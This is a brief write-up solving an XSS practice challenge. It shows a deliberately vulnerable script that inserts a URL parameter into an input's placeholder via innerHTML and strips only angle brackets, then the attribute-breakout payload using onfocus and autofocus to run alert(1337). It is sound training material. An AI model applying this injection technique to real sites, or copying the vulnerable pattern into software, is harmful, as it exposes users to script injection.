# Ugandan Knuckles - Exercise 3

[Problem](https://xss.pwnfunction.com/warmups/da-wey/)

[Solution](https://sandbox.pwnfunction.com/warmups/da-wey.html?wey=sample%22%20onfocus=%22alert(1337)%22%20autofocus=%22)

## Explanation

Here is the part to inject JS

```html
<div id="uganda"></div>
<script>
    let wey = (new URL(location).searchParams.get('wey') || "do you know da wey?");
    wey = wey.replace(/[<>]/g, '')
    uganda.innerHTML = `<input type="text" placeholder="${wey}" class="form-control">`
</script>
```

Here we have the freedom to choose the parameter *wey*, but it cannot have `<` or `>` as it gets replaced later. This makes it impossible to add a new tag in between. Still we can control the attributes of input tag div uganda, which gets added later in the code. Set the value of wey to be `sample" onfocus="alert(1337)" autofocus="` which adds a input element in the div `<input type="text" placeholder="sample" onfocus="alert(1337)" autofocus="" class="form-control">`, and Voila!

### This might be helpful

[This is where I learned the autofocus trick from](https://security.stackexchange.com/questions/97550/how-to-launch-xss-code-from-an-input-html-tag-upon-page-load)
